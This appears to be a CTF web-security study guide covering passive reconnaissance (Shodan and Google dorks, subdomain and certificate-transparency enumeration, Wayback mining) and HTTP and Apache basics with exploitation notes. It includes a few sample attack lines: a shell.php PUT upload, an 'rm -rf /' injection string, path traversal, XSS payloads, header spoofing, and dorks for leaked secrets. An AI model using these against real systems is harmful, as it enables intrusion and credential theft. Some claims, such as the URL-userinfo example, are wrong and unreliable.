**CTF-Relevant Shodan Dorks**

```
hostname:target.com port:22
# SSH services running on target domain

hostname:target.com port:3306
# MySQL/MariaDB databases (potential remote access)

hostname:target.com "Apache" "2.4.1"
# Specific vulnerable Apache version

ssl.cert.subject.CN:target.com
# All services using SSL certificates for target domain

org:"Target Organization" country:US product:"nginx"
# Infrastructure reconnaissance for organization

hostname:target.com http.title:"admin"
# Web interfaces with "admin" in title

port:8080 ssl.cert.subject.CN:target.com
# Alternative ports and SSL services

hostname:target.com "200 OK" http.status:200
# Successfully responding services
```

**Command-Line Shodan Access**

```bash
# Install Shodan CLI
pip3 install shodan

# Initialize API key
shodan init YOUR_API_KEY

# Search from terminal
shodan search 'hostname:target.com port:22'

# Get detailed information
shodan host 192.168.1.1

# Search with filters
shodan search 'org:"Target Org" country:US port:443'

# Export results
shodan download --limit 10000 results 'hostname:target.com'
shodan parse results.json --fields ip_str,port,org,product
```

**Interpreting Shodan Results**

Each result typically contains:

- **IP Address**: Direct infrastructure location
- **Port**: Service endpoint
- **Service Banner**: Software name and version (exploitation vector)
- **HTTP Headers**: Web server technology stack
- **SSL Certificates**: Domain validation, CA information, certificate expiration
- **Last Updated**: Data freshness indicator

[Inference] Shodan data may be outdated (weeks to months old). Services may have been patched or removed since indexing. Verify findings with active reconnaissance.

**Combining Reconnaissance Sources**

```bash
# Workflow: Subdomain enumeration â†’ Shodan verification
ffuf -u https://FUZZ.target.com -w wordlist.txt -o subdomains.json -of json

# Extract IPs for discovered subdomains
dig +short subdomain.target.com

# Query Shodan for those IPs
shodan host DISCOVERED_IP

# Identify vulnerable versions or services
# Compare against known CVE databases
```

---

## OSINT Techniques

### Passive DNS Enumeration

**DNSDumpster** (web-based)

- Navigate to `https://dnsdumpster.com`
- Provides subdomain mapping, DNS records, and network topology visualization
- No authentication required, rate-limited by IP

**SecurityTrails**

```bash
# API-based reconnaissance (requires free API key)
curl -H "APIKEY: <your_key>" \
  "https://api.securitytrails.com/v1/domain/target.com/subdomains"
```

**Sublist3r**

```bash
# Aggregate subdomain enumeration
sublist3r -d target.com -o output.txt

# With brute force
sublist3r -d target.com -b -o output.txt

# Specific engines only
sublist3r -d target.com -e google,virustotal
```

**Amass**

```bash
# Passive enumeration only (stealthy)
amass enum -passive -d target.com -o amass_output.txt

# Active enumeration with DNS queries
amass enum -d target.com -o amass_active.txt

# With additional data sources
amass enum -d target.com -src -o detailed.txt
```

### Google Dorking for Web Applications

**Common Operators**

```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intext:"index of /"
site:target.com ext:php inurl:?id=
site:target.com inurl:login | inurl:signin
site:target.com intitle:"Dashboard" inurl:admin
```

**Sensitive Information Discovery**

```
site:target.com filetype:env "DB_PASSWORD"
site:target.com filetype:log
site:target.com ext:sql | ext:bak
site:target.com inurl:phpinfo.php
site:target.com "aws_access_key_id"
```

**Technology Stack Identification**

```
site:target.com "powered by WordPress"
site:target.com inurl:"/wp-content/"
site:target.com "Laravel" inurl:"/public/"
```

### Shodan Intelligence

**Web Interface Searches**

```
hostname:target.com
ssl:target.com
http.title:"Company Name"
http.html:"/admin/"
port:8080 hostname:target.com
```

**Shodan CLI** (requires API key)

```bash
# Install
pip install shodan

# Initialize
shodan init <API_KEY>

# Search for hosts
shodan search hostname:target.com

# Get host details
shodan host <IP_ADDRESS>

# Download search results
shodan download results "hostname:target.com"
shodan parse --fields ip_str,port,org results.json.gz
```

### GitHub/GitLab Reconnaissance

**GitHub Dorking**

```
org:target "api_key"
org:target "password"
org:target extension:env
user:target "aws_secret"
target.com filename:.git-credentials
```

**TruffleHog** (secret scanning)

```bash
# Scan repository for secrets
trufflehog git https://github.com/target/repo --json

# Scan entire GitHub org
trufflehog github --org=target-org

# Scan with custom regex
trufflehog filesystem /path/to/code --json
```

**GitLeaks**

```bash
# Scan local repository
gitleaks detect -s /path/to/repo -v

# Scan remote repository
gitleaks detect --source https://github.com/target/repo

# Generate report
gitleaks detect -s . -r report.json
```

### Email and User Enumeration

**theHarvester**

```bash
# Email harvesting from multiple sources
theHarvester -d target.com -b all -l 500

# Specific sources
theHarvester -d target.com -b google,linkedin,bing

# DNS brute force included
theHarvester -d target.com -b all -c
```

**Hunter.io** (via CLI)

```bash
# Requires API key
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=<key>"
```

### Metadata Extraction

**ExifTool**

```bash
# Extract metadata from uploaded files
exiftool image.jpg

# Recursive directory analysis
exiftool -r /path/to/files/ > metadata.txt

# Extract GPS coordinates
exiftool -gps:all image.jpg

# Strip metadata
exiftool -all= file.jpg
```

**FOCA** (Windows-based)

- Download documents from target domain
- Automated metadata extraction
- User/path enumeration from document properties

### Web Technology Fingerprinting

**WhatWeb**

```bash
# Basic scan
whatweb https://target.com

# Aggressive scanning
whatweb -a 3 https://target.com

# Output to JSON
whatweb --log-json=output.json https://target.com
```

**Wappalyzer CLI**

```bash
# Install
npm i -g wappalyzer

# Scan URL
wappalyzer https://target.com
```

**Webanalyze**

```bash
# Scan with signature database
webanalyze -host https://target.com -apps apps.json
```

---

## Wayback Machine Analysis

### Web Interface Enumeration

**URL History Discovery**

- Access: `https://web.archive.org/web/*/target.com`
- Identifies historical snapshots showing:
    - Removed administrative endpoints
    - Legacy API documentation
    - Deprecated parameters
    - Former directory structures

**Strategic Analysis Points**

- **Snapshot comparison**: Identify removed/hidden paths
- **JavaScript changes**: Track new endpoints in JS files over time
- **Form evolution**: Discover removed parameters that may still function
- **Comment archaeology**: Find developer comments in old source code

### Wayback Machine CLI Tools

**Waybackurls**

```bash
# Install
go install github.com/tomnomnom/waybackurls@latest

# Fetch all archived URLs
echo "target.com" | waybackurls > wayback_urls.txt

# Filter for specific paths
echo "target.com" | waybackurls | grep -E "\.js$|\.php$|\.aspx$"

# Parameters extraction
cat wayback_urls.txt | grep "?" | cut -d "?" -f 2 | sort -u
```

**gau (GetAllUrls)**

```bash
# Install
go install github.com/lc/gau/v2/cmd/gau@latest

# Fetch from multiple sources (Wayback, Common Crawl, etc.)
gau target.com --o gau_output.txt

# Limit providers
gau --providers wayback,commoncrawl target.com

# Filter by blacklist
gau target.com --blacklist png,jpg,gif,svg
```

**WaybackPack**

```bash
# Install
pip install waybackpack

# Download all snapshots
waybackpack target.com -d target_archive/

# Specific date range
waybackpack target.com --from-date 20200101 --to-date 20201231
```

### Practical CTF Applications

**Endpoint Discovery**

```bash
# Extract unique paths
waybackurls target.com | unfurl paths | sort -u

# Find API endpoints
waybackurls target.com | grep -iE "api|v[0-9]" | sort -u

# Locate admin panels
waybackurls target.com | grep -iE "admin|panel|dashboard|login" | sort -u
```

**Parameter Mining**

```bash
# Extract all parameters
waybackurls target.com | grep "=" | \
  sed 's/=.*/=/' | sort -u > parameters.txt

# Identify injection points
cat wayback_urls.txt | grep -E "\?.*=" | \
  awk -F'?' '{print $2}' | tr '&' '\n' | cut -d'=' -f1 | sort -u
```

**Historical JavaScript Analysis**

```bash
# Download all JS file versions
waybackurls target.com | grep "\.js$" | sort -u > js_files.txt

# Download each version
while read url; do
    wget -q "$url" -P js_archive/
done < js_files.txt

# Extract endpoints from JS
grep -rEoh "(/[a-zA-Z0-9_/?=&-]*)" js_archive/ | sort -u
```

**Diff Analysis for Changes**

```bash
# Compare two snapshots
diff <(curl -sL "http://web.archive.org/web/20200101000000/target.com") \
     <(curl -sL "http://web.archive.org/web/20210101000000/target.com")
```

---

## Certificate Transparency Logs

### Understanding CT Logs

Certificate Transparency logs are public, append-only ledgers of SSL/TLS certificates. They reveal:

- All subdomains issued certificates (including internal/staging)
- Wildcard certificate coverage
- Certificate authorities used
- Issuance timelines

### crt.sh Web Interface

**Manual Queries**

```
# Basic domain search
https://crt.sh/?q=target.com

# Wildcard search for subdomains
https://crt.sh/?q=%.target.com

# Exclude expired certificates
https://crt.sh/?q=%.target.com&exclude=expired

# JSON output
https://crt.sh/?q=%.target.com&output=json
```

### Automated CT Log Enumeration

**crt.sh API Extraction**

```bash
# Fetch subdomains via API
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomains.txt

# Filter only active certificates
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[] | select(.not_after > now) | .name_value' | sort -u
```

**Certspotter**

```bash
# Install
go install github.com/SSLMate/certspotter/cmd/certspotter@latest

# Query CT logs
certspotter -domain target.com -o certspotter_output.json
```

**ctfr** (Certificate Transparency Finder)

```bash
# Install
pip3 install ctfr

# Enumerate subdomains
ctfr -d target.com -o ctfr_output.txt
```

**Subfinder with CT Sources**

```bash
# Install
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Passive enumeration (includes CT logs)
subfinder -d target.com -o subfinder_output.txt -all

# Silent mode with specific sources
subfinder -d target.com -sources certspotter,censys,crtsh -silent
```

### Advanced CT Log Analysis

**Historical Certificate Analysis**

```bash
# Download full certificate data
curl -s "https://crt.sh/?q=%.target.com&output=json" > full_certs.json

# Extract Common Names and SANs
jq -r '.[].common_name' full_certs.json | sort -u
jq -r '.[].name_value' full_certs.json | sort -u

# Identify certificate issuers
jq -r '.[] | "\(.issuer_name) | \(.common_name)"' full_certs.json | sort | uniq -c
```

**Wildcard Certificate Discovery**

```bash
# Find wildcard certs
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[] | select(.name_value | contains("*")) | .name_value' | sort -u

# This reveals infrastructure patterns
```

**Internal/Staging Subdomain Identification**

```bash
# Filter for common internal naming
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | grep -iE "staging|dev|test|internal|admin|vpn|mail" | sort -u
```

### Combining CT Logs with Other Sources

**Comprehensive Subdomain Enumeration Workflow**

```bash
#!/bin/bash
domain=$1

# CT Logs
curl -s "https://crt.sh/?q=%.$domain&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > ct_subs.txt

# Amass passive
amass enum -passive -d $domain -o amass_subs.txt

# Subfinder
subfinder -d $domain -all -silent -o subfinder_subs.txt

# Merge and deduplicate
cat ct_subs.txt amass_subs.txt subfinder_subs.txt | \
  sort -u | tee all_subdomains.txt

# Resolve active hosts
cat all_subdomains.txt | httpx -silent -o active_hosts.txt
```

### CT Log Monitoring for New Certificates

**CertStream** (real-time monitoring)

```bash
# Install
pip install certstream

# Monitor for new certificates
certstream --domain target.com
```

**Practical CTF Use Case**

```bash
# Find recently issued certificates (may indicate new infrastructure)
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[] | select(.entry_timestamp > (now - 604800 | strftime("%Y-%m-%dT%H:%M:%S"))) | .name_value' | \
  sort -u
```

### Cross-Referencing CT Data

**Identifying Certificate Patterns**

```bash
# Group by issuer to identify infrastructure providers
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[] | .issuer_name' | sort | uniq -c | sort -rn

# Find certificates with unusual SANs
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[] | select(.name_value | contains(",")) | .name_value'
```

---

## Integration Workflow for CTF Scenarios

**Complete Reconnaissance Pipeline**

```bash
#!/bin/bash
TARGET=$1

mkdir -p recon/$TARGET/{subdomains,urls,technologies,secrets}

# Phase 1: Subdomain enumeration
echo "[+] Certificate Transparency"
curl -s "https://crt.sh/?q=%.$TARGET&output=json" | jq -r '.[].name_value' | sort -u > recon/$TARGET/subdomains/ct.txt

echo "[+] Subfinder"
subfinder -d $TARGET -all -silent -o recon/$TARGET/subdomains/subfinder.txt

echo "[+] Amass"
amass enum -passive -d $TARGET -o recon/$TARGET/subdomains/amass.txt

# Phase 2: URL discovery
cat recon/$TARGET/subdomains/*.txt | sort -u | httpx -silent | tee recon/$TARGET/subdomains/live.txt

echo "[+] Wayback URLs"
cat recon/$TARGET/subdomains/live.txt | waybackurls | tee recon/$TARGET/urls/wayback.txt

echo "[+] GAU"
cat recon/$TARGET/subdomains/live.txt | gau | tee recon/$TARGET/urls/gau.txt

# Phase 3: Technology detection
echo "[+] WhatWeb"
cat recon/$TARGET/subdomains/live.txt | while read url; do
    whatweb -a 3 "$url" | tee -a recon/$TARGET/technologies/whatweb.txt
done

# Phase 4: Parameter extraction
cat recon/$TARGET/urls/*.txt | grep "=" | sed 's/=.*/=/' | sort -u > recon/$TARGET/urls/parameters.txt

echo "[+] Reconnaissance complete: recon/$TARGET/"
```

**Key Reconnaissance Priorities for CTF**

1. Subdomain discovery (CT logs + passive DNS)
2. Historical endpoint analysis (Wayback Machine)
3. Parameter identification (archived URLs)
4. Technology fingerprinting (stack-specific vulnerabilities)
5. Exposed secrets (GitHub, metadata, JS files)

---

## Recommended Related Topics

Given the reconnaissance foundation, these advanced topics build directly on enumeration findings:

- **Active Web Application Scanning** (Nikto, Burp Suite automation) - applies to discovered live hosts
- **Content Discovery & Forced Browsing** (Gobuster, Feroxbuster) - targets identified subdomains
- **JavaScript Analysis & API Discovery** (JSFinder, LinkFinder) - examines archived JS files

---

# Web Server Basics & Architecture

## HTTP/HTTPS Fundamentals

### Protocol Structure

HTTP (Hypertext Transfer Protocol) operates at the application layer (Layer 7) using TCP as its transport protocol. The standard ports are 80 (HTTP) and 443 (HTTPS).

**HTTP Message Format:**

```
[METHOD] [URI] HTTP/[VERSION]
[Headers]

[Body]
```

**HTTPS Differences:**

- TLS/SSL encryption wraps HTTP traffic
- Certificate-based authentication
- Port 443 default
- Prevents plaintext interception but not application-layer attacks

### HTTP Methods

**Standard Methods:**

- `GET` - Retrieve resource, parameters in URL
- `POST` - Submit data, parameters in body
- `PUT` - Replace entire resource
- `DELETE` - Remove resource
- `HEAD` - GET without response body
- `OPTIONS` - Query supported methods
- `PATCH` - Partial resource modification
- `TRACE` - Echo request for debugging
- `CONNECT` - Establish tunnel (proxy)

**CTF Exploitation Relevance:**

- `OPTIONS` reveals allowed methods for enumeration
- `TRACE` can expose headers for XSS/credential theft
- `PUT`/`DELETE` may be improperly enabled for file upload/deletion
- Method override via `X-HTTP-Method-Override` header bypasses restrictions

**Testing Methods:**

```bash
# Enumerate allowed methods
curl -X OPTIONS http://target.com/path -v

# Attempt PUT upload
curl -X PUT http://target.com/shell.php -d @shell.php

# Method override
curl -X POST http://target.com/admin -H "X-HTTP-Method-Override: DELETE"
```

## Request-Response Cycle

### Client Request Components

**1. Request Line:**

```
GET /api/users?id=5 HTTP/1.1
```

- Method: `GET`
- Path: `/api/users`
- Query string: `?id=5`
- Version: `HTTP/1.1` or `HTTP/2`

**2. Headers:**

```
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html,application/json
Cookie: session=abc123
Authorization: Bearer token_here
```

**3. Body (for POST/PUT/PATCH):**

```
username=admin&password=test
```

### Server Response Components

**1. Status Line:**

```
HTTP/1.1 200 OK
```

**2. Response Headers:**

```
Content-Type: application/json
Set-Cookie: session=xyz789; HttpOnly; Secure
Content-Length: 1234
Server: Apache/2.4.41
```

**3. Response Body:**

```json
{"user": "admin", "role": "administrator"}
```

### Request Flow

```
1. DNS Resolution: domain â†’ IP address
2. TCP Handshake: SYN â†’ SYN-ACK â†’ ACK
3. TLS Handshake (HTTPS): Certificate exchange, cipher negotiation
4. HTTP Request: Client sends formatted request
5. Server Processing: Application logic, database queries
6. HTTP Response: Server sends formatted response
7. Connection: Keep-alive or close
```

**Intercepting with Burp Suite:**

```bash
# Configure proxy
firefox --proxy-server="localhost:8080" &

# In Burp: Proxy â†’ Intercept â†’ Intercept is on
# Modify request before forwarding
```

**Using curl for raw requests:**

```bash
# View full request/response
curl -v http://target.com/api

# Custom headers
curl -H "X-Custom: value" http://target.com

# Follow redirects
curl -L http://target.com

# Save response headers
curl -D headers.txt http://target.com
```

## Status Codes

### 1xx Informational

- `100 Continue` - Server ready for request body
- `101 Switching Protocols` - WebSocket upgrade

### 2xx Success

- `200 OK` - Standard success
- `201 Created` - Resource created (POST)
- `202 Accepted` - Processing asynchronously
- `204 No Content` - Success without body

### 3xx Redirection

- `301 Moved Permanently` - Resource relocated, update bookmarks
- `302 Found` - Temporary redirect
- `303 See Other` - GET alternate resource
- `304 Not Modified` - Cached version valid
- `307 Temporary Redirect` - Preserve method
- `308 Permanent Redirect` - Preserve method

**CTF Exploitation:**

- Open redirects via `Location` header manipulation
- Redirect chains can bypass filters
- `304` responses may leak cache timing

```bash
# Follow redirect chain
curl -L -v http://target.com/redirect

# Prevent redirect following
curl http://target.com/redirect
```

### 4xx Client Errors

- `400 Bad Request` - Malformed syntax
- `401 Unauthorized` - Authentication required
- `403 Forbidden` - Authenticated but unauthorized
- `404 Not Found` - Resource doesn't exist
- `405 Method Not Allowed` - Wrong HTTP method
- `406 Not Acceptable` - Cannot produce acceptable content-type
- `408 Request Timeout` - Client too slow
- `409 Conflict` - Request conflicts with state
- `413 Payload Too Large` - Body exceeds limit
- `415 Unsupported Media Type` - Wrong Content-Type
- `429 Too Many Requests` - Rate limited

**CTF Exploitation:**

- `403` vs `404` reveals path existence
- `405` enumerates allowed methods
- `413`/`415` reveals input validation boundaries

### 5xx Server Errors

- `500 Internal Server Error` - Application crash
- `501 Not Implemented` - Method not supported
- `502 Bad Gateway` - Upstream server failure
- `503 Service Unavailable` - Temporary overload
- `504 Gateway Timeout` - Upstream timeout

**CTF Exploitation:**

- `500` errors may leak stack traces, paths, framework versions
- `502`/`504` indicate reverse proxy/load balancer presence

**Fuzzing for error disclosure:**

```bash
# wfuzz for status code enumeration
wfuzz -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 \
  http://target.com/FUZZ

# ffuf with status filtering
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u http://target.com/FUZZ \
  -mc 200,301,302,403,500
```

## Headers and Metadata

### Request Headers

**Host:**

```
Host: example.com
```

- Mandatory in HTTP/1.1
- Virtual hosting support
- **Exploitation:** Host header injection for cache poisoning, SSRF, password resets

```bash
# Host header manipulation
curl -H "Host: attacker.com" http://target.com
```

**User-Agent:**

```
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
```

- Client identification
- **Exploitation:** Filter bypasses, browser-specific vulnerabilities

**Accept:**

```
Accept: text/html,application/json;q=0.9,*/*;q=0.8
```

- Preferred content types with quality values
- **Exploitation:** Content-type confusion, XXE via XML acceptance

**Cookie:**

```
Cookie: session=abc123; token=xyz789
```

- Session/authentication tokens
- **Exploitation:** Primary target for session hijacking, fixation

**Authorization:**

```
Authorization: Basic dXNlcjpwYXNz
Authorization: Bearer eyJhbGc...
```

- Credentials/tokens
- Basic: Base64 `username:password`
- Bearer: OAuth/JWT tokens

**Referer:**

```
Referer: https://previous-page.com/link
```

- Originating page
- **Exploitation:** CSRF validation bypass, access control flaws

**Content-Type:**

```
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data; boundary=----Boundary
Content-Type: application/json
```

- Body encoding format
- **Exploitation:** Content-type switching for filter bypass

**X-Forwarded-For:**

```
X-Forwarded-For: 192.168.1.100
X-Real-IP: 10.0.0.5
```

- Proxy/load balancer client IP
- **Exploitation:** IP-based authentication bypass, SSRF

```bash
# IP spoofing attempt
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
curl -H "X-Real-IP: 192.168.1.1" http://target.com
```

### Response Headers

**Set-Cookie:**

```
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

- `HttpOnly` - Prevents JavaScript access (XSS mitigation)
- `Secure` - HTTPS-only transmission
- `SameSite` - CSRF protection (Strict/Lax/None)
- **Exploitation:** Missing flags enable XSS/CSRF attacks

**Content-Type:**

```
Content-Type: text/html; charset=UTF-8
```

- Response body format
- **Exploitation:** Misconfigured headers enable XSS (text/html with user content)

**Content-Length:**

```
Content-Length: 1234
```

- Body size in bytes
- **Exploitation:** Request smuggling via Content-Length/Transfer-Encoding conflicts

**Transfer-Encoding:**

```
Transfer-Encoding: chunked
```

- Streaming responses in chunks
- **Exploitation:** HTTP request smuggling

**Location:**

```
Location: https://newsite.com/page
```

- Redirect target
- **Exploitation:** Open redirect if user-controlled

**Server:**

```
Server: Apache/2.4.41 (Ubuntu)
Server: nginx/1.18.0
```

- Web server identification
- **Exploitation:** Version-specific CVE targeting

**X-Powered-By:**

```
X-Powered-By: PHP/7.4.3
X-Powered-By: Express
```

- Framework/language version
- **Exploitation:** Technology fingerprinting for targeted exploits

**Access-Control-Allow-Origin (CORS):**

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
```

- Cross-origin resource sharing
- **Exploitation:** Wildcard + credentials = credential theft

```bash
# CORS testing
curl -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: GET" \
  -X OPTIONS http://target.com/api
```

**Content-Security-Policy:**

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

- XSS mitigation policy
- **Exploitation:** Weak policies (`unsafe-inline`, `unsafe-eval`) allow XSS

**X-Frame-Options:**

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

- Clickjacking protection
- **Exploitation:** Missing header enables iframe attacks

**Strict-Transport-Security:**

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

- Forces HTTPS
- **Exploitation:** Missing HSTS allows SSL stripping

### Security Header Analysis

```bash
# Check security headers
curl -I https://target.com | grep -E "(X-Frame|Content-Security|Strict-Transport|X-Content-Type)"

# Automated security header scanner
nikto -h http://target.com -Tuning 9
```

### Custom Headers

Applications may use custom headers:

```
X-API-Key: secret_key_123
X-Request-ID: uuid-here
X-Custom-Auth: token
```

**Enumeration:**

```bash
# Headers from Burp history
grep "^X-" burp_requests.txt | sort -u

# Brute force custom headers
wfuzz -z file,headers.txt -H "FUZZ: test" http://target.com
```

### HTTP/2 Specific Features

- Binary protocol (not text)
- Multiplexing (multiple requests/responses on single connection)
- Server push capabilities
- Header compression (HPACK)

**Exploitation differences:**

- Request smuggling techniques differ (HTTP/2 downgrade attacks)
- Pseudo-headers (`:method`, `:path`, `:authority`) manipulation

```bash
# Force HTTP/2
curl --http2 https://target.com

# Check HTTP version
curl -I https://target.com | grep "^HTTP/"
```

---

## URL Structure and Parsing

### URL Anatomy

Understanding URL components is fundamental to web exploitation, as each part can be independently manipulated or exploited.

**Standard URL format:**

```
scheme://userinfo@host:port/path?query#fragment
```

**Complete example with all components:**

```
https://admin:password@api.example.com:8443/v2/users?id=123&role=admin#section2
```

**Component breakdown:**

**Scheme (protocol):** Defines communication protocol.

- `http://` - Unencrypted HTTP
- `https://` - HTTP over TLS/SSL encryption
- `ftp://`, `ftps://` - File transfer protocols
- `file://` - Local file access
- `ws://`, `wss://` - WebSocket (unencrypted and encrypted)
- `data:` - Data URI scheme (embeds data inline)
- Custom schemes: `myapp://`, `custom-protocol://`

**Userinfo:** Optional username and password (deprecated in modern practice).

```
https://username:password@example.com
```

[Unverified] Modern browsers increasingly strip or warn about embedded credentials in URLs.

**Host:** Domain name or IP address.

- FQDN: `api.example.com`
- IPv4: `192.0.2.1`
- IPv6: `[2001:db8::1]` (brackets required)
- Localhost: `localhost`, `127.0.0.1`, `::1`

**Port:** Service endpoint on host (default ports: 80 for HTTP, 443 for HTTPS).

```
http://example.com:8080
https://api.example.com:8443
```

**Path:** Resource location on server.

```
/api/v2/users
/admin/dashboard
/index.html
```

Path traversal vulnerabilities exploit improper path handling:

```
/../../etc/passwd  # Directory traversal attempt
/api/../../admin   # Escaping API path
```

**Query string:** Key-value pairs passed to server.

```
?id=123&role=admin&sort=name
?search=test%20query  # URL-encoded space as %20
```

Query strings are commonly vulnerable to:

- SQL injection: `?id=1' OR '1'='1`
- Command injection: `?cmd=ls; rm -rf /`
- XXE: `?xml=<!DOCTYPE foo [...]>`

**Fragment:** Client-side anchor (not sent to server by default).

```
#section2
#top
```

[Inference] Fragments are processed client-side by JavaScript, making them invisible to server-side logging but relevant to client-side attacks (DOM-based XSS).

---

### URL Encoding and Parsing

URL encoding converts special characters to percent-encoded format (`%HH` where HH is hexadecimal).

**Common encoded characters:**

```
Space: %20 or +
!: %21
": %22
#: %23 (fragment identifier)
$: %24
%: %25 (literal percent)
&: %26 (query separator)
': %27
(: %28
): %29
+: %2B
,: %2C
/: %2F
:: %3A
;: %3B
=: %3D (key-value separator)
?: %3F (query string initiator)
@: %40
[: %5B
\: %5C
]: %5D
^: %5E
`: %60
{: %7B
|: %7C
}: %7D
~: %7E
```

**Encoding/decoding tools:**

```bash
# Using printf to encode
printf '%s\n' "test string" | od -An -tx1 | tr ' ' % | tr -d '\n'

# Using Python
python3 -c "import urllib.parse; print(urllib.parse.quote('test string'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('test%20string'))"

# Using curl (automatic encoding)
curl "http://example.com/search?q=$(printf '%s\n' 'search term' | sed 's/ /%20/g')"

# Using jq for JSON in URLs
echo '{"key":"value with space"}' | jq -r 'to_entries | map("\(.key)=\(.value)") | join("&")'
```

**Double encoding exploitation:**

Some WAFs and filters decode URLs once; double encoding bypasses single-pass filters.

```
Original: /admin
First encoding: %2Fadmin
Second encoding: %252Fadmin
```

Web servers may decode multiple times:

```bash
# Payload bypassing simple filter
curl "http://example.com/%252e%252e%252fadmin"  # %2F decodes to /, becomes ../../admin
```

**URL parsing vulnerabilities:**

Different parsers handle ambiguous URLs differently, creating security inconsistencies.

```bash
# Backslash vs forward slash
http://example.com\admin    # Some parsers treat \ as path separator
http://example.com/admin

# Double slashes
http://example.com//admin   # May bypass path-based access controls

# URL with credentials obscuring host
http://attacker.com@example.com  # Browser shows example.com but connects to attacker.com
# [Unverified] Behavior depends on browser and parser implementation

# Null byte injection (legacy vulnerability)
http://example.com/admin%00.html  # Null terminates string in some parsers
```

**Query string parsing inconsistencies:**

Different platforms parse query strings differently, useful for filter evasion.

```
# Parameter precedence varies
?id=1&id=2
# PHP takes last value (id=2)
# Apache takes first value (id=1)  
# ASP.NET takes comma-separated list (id=1,2)
# JSP concatenates: id=1&id=2
```

**Exploitation example:**

```bash
# Bypass filter expecting single parameter
# Attacker crafts: ?user=legitimate&user=<script>alert('xss')</script>
# Filter sees legitimate, but ASP.NET processes both values
curl "http://example.com/page?user=legitimate&user=%3Cscript%3Ealert('xss')%3C/script%3E"
```

---

### Fragment Handling

Fragments (`#identifier`) are client-side only and handled differently by servers and browsers.

**Server-side visibility:**

```bash
# Fragment never sent to server in HTTP request
curl -v "http://example.com/page#section"
# Network capture shows: GET /page HTTP/1.1
# #section is omitted

# Server cannot see fragment via standard HTTP
```

**JavaScript fragment manipulation:**

```javascript
// Client-side access to fragment
window.location.hash = "#newsection"
var currentFragment = window.location.hash  // #newsection

// DOM-based XSS via fragment
window.location.hash = "<img src=x onerror=alert('xss')>"
document.getElementById('content').innerHTML = window.location.hash.substring(1)
```

**Single-page application (SPA) fragment routing:**

SPAs use fragments for client-side navigation:

```
https://app.example.com/#/dashboard
https://app.example.com/#/user/123/edit
```

[Inference] Fragments in SPAs control client-side state; URL parameters still route to server, creating dual attack surfaces.

---

## Web Server Types

### Apache HTTP Server

Apache is the most deployed web server historically. Configuration spans multiple files and modules.

**Installation (Kali/Debian):**

```bash
apt-get install apache2
systemctl start apache2
systemctl status apache2
```

**Architecture and modules:**

Apache uses a modular architecture where functionality loads as modules (`.so` files).

```bash
# List loaded modules
apache2ctl -M

# Common exploitation-relevant modules
mod_php          # PHP execution
mod_cgi           # CGI script execution
mod_ssl           # HTTPS/TLS support
mod_rewrite       # URL rewriting and redirect
mod_proxy         # Reverse proxy functionality
mod_userdir       # User public_html directory access (~username)
mod_status        # Server status page (/server-status)
mod_info          # Server configuration information (/server-info)
mod_autoindex     # Directory listing
```

**Main configuration file:**

```
/etc/apache2/apache2.conf        # Primary configuration (Debian/Kali)
/etc/httpd/conf/httpd.conf       # Primary configuration (RHEL/CentOS)
```

**Virtual host configuration:**

```bash
/etc/apache2/sites-available/    # Virtual host definitions
/etc/apache2/sites-enabled/      # Symlinks to enabled sites

# Enable/disable sites
a2ensite sitename
a2dissite sitename
```

**Directory structure (default):**

```
/var/www/html/           # Default document root
/var/www/html/index.html # Default landing page
```

**Configuration syntax exploitable for reconnaissance:**

```apache
# httpd.conf or site configuration files may reveal information

<Directory /var/www/html>
    Options Indexes FollowSymLinks  # Allows directory listing and symlink following
    AllowOverride All               # Allows .htaccess overrides
    Require all granted
</Directory>

# Symlink following vulnerability example:
# Attacker creates: /var/www/html/link -> /etc/passwd
# Then accesses: http://example.com/link
```

**Default modules providing reconnaissance:**

```bash
# Server status page (if mod_status enabled)
curl http://example.com/server-status
# Shows traffic, processes, modules, configuration

# Server info page (if mod_info enabled)
curl http://example.com/server-info
# Displays all modules, configuration, server variables
```

**Apache rewrite rules (mod_rewrite):**

Rewrite rules can obscure URL structure or introduce vulnerabilities:

```apache
# .htaccess or httpd.conf
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php?page=$1 [QSA,L]

# Effectively routes all requests to index.php with original path as parameter
```

**Exploitation via misconfigured rewrite rules:**

```bash
# If rewrite logs verbosity enabled, may leak information
curl http://example.com/../../etc/passwd
# Rewrite logs might reveal: Attempting /../../etc/passwd -> /index.php?page=../../etc/passwd
```

**User directories (mod_userdir):**

```bash
# If enabled, user public_html directories accessible
curl http://example.com/~username/
# Accesses /home/username/public_html/

# Reconnaissance: enumerate system users
for user in {0..1000}; do
  curl -s http://example.com/~$user/ | grep -q "Index of" && echo "User found"
done
```

**Common Apache misconfigurations:**

```apache
# Overly permissive Options directive
Options Indexes FollowSymLinks ExecCGI  # Allows directory listing, symlinks, CGI execution

# Weak access controls
<Directory /sensitive>
    Require all granted  # No authentication required
</Directory>

# Default credentials in .htaccess
